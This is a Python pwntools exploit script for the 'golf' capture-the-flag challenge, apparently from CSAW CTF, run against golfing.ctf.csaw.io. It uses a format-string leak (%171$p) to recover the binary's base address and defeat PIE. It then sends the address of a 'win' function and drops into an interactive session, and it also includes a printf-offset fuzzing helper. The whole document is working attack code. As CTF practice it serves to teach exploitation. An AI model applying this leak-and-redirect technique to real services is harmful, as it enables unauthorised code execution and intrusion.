#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './golf' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'golfing.ctf.csaw.io', 9999 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================
def fuzz():
    for i in range(171, 172):
        io = initialize()
        io.sendlineafter(b'name?', f'%{i}$p')
        io.recvuntil(b'hello: ')
        print(f'{i}: {io.recvline().strip()}')
        io.close()



# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    io.sendlineafter(b'name?', b'%171$p')
    io.recvuntil(b'hello: ')
    elf.address = int(io.recvline().strip(), 16) - elf.sym['main']
    info(f'elf.address: {hex(elf.address)}')
    
    win = elf.sym['win']
    io.sendlineafter(b':', f'{hex(win)}')
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()
    # fuzz()